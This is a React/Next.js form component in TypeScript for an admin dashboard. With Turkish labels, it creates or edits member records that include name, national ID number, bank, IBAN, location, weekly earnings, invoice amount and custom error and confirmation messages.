"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { DialogFooter } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import type { AdminMember } from "@/app/dashboard/admin/page";

type AdminMemberFormProps = {
    member?: AdminMember | null;
    onSave: (memberData: Omit<AdminMember, 'id'> | AdminMember) => void;
    onCancel: () => void;
};

const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => {
    const [formData, setFormData] = useState({
        name: member?.name || "",
        iban: member?.iban || "",
        bank: member?.bank || "",
        tc: member?.tc || "",
        il: member?.il || "",
        ilce: member?.ilce || "",
        weeklyGain: member?.weeklyGain || "",
        errorMessage: member?.errorMessage || "",
        successMessage: member?.successMessage || "",
        invoiceAmount: member?.invoiceAmount || "",
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        const memberData = member ? { ...member, ...formData } : { ...formData };
        onSave(memberData);
    };
    
    return (
        <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                 <div className="space-y-2">
                    <Label htmlFor="name">Ad Soyad</Label>
                    <Input id="name" value={formData.name} onChange={handleChange} placeholder="Ad Soyad" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="tc">TC Kimlik No</Label>
                    <Input id="tc" value={formData.tc} onChange={handleChange} placeholder="TC Kimlik No" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="bank">Banka</Label>
                    <Input id="bank" value={formData.bank} onChange={handleChange} placeholder="Banka Adı" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="iban">IBAN</Label>
                    <Input id="iban" value={formData.iban} onChange={handleChange} placeholder="TR..." required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="il">İl</Label>
                    <Input id="il" value={formData.il} onChange={handleChange} placeholder="İl" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="ilce">İlçe</Label>
                    <Input id="ilce" value={formData.ilce} onChange={handleChange} placeholder="İlçe" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="weeklyGain">Haftalık Kazanç</Label>
                    <Input id="weeklyGain" value={formData.weeklyGain} onChange={handleChange} placeholder="Örn: 1500 TL" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="invoiceAmount">Fatura Tutarı</Label>
                    <Input id="invoiceAmount" value={formData.invoiceAmount} onChange={handleChange} placeholder="Örn: 1250 TL" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="errorMessage">Hata Mesajı</Label>
                    <Input id="errorMessage" value={formData.errorMessage} onChange={handleChange} placeholder="Görüşme hata mesajı" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="successMessage">Onay Mesajı</Label>
                    <Input id="successMessage" value={formData.successMessage} onChange={handleChange} placeholder="Görüşme onay mesajı" required />
                </div>
            </div>
            <DialogFooter>
                <Button type="button" variant="ghost" onClick={onCancel}>İptal</Button>
                <Button type="submit">Kaydet</Button>
            </DialogFooter>
        </form>
    );
};

export default AdminMemberForm;
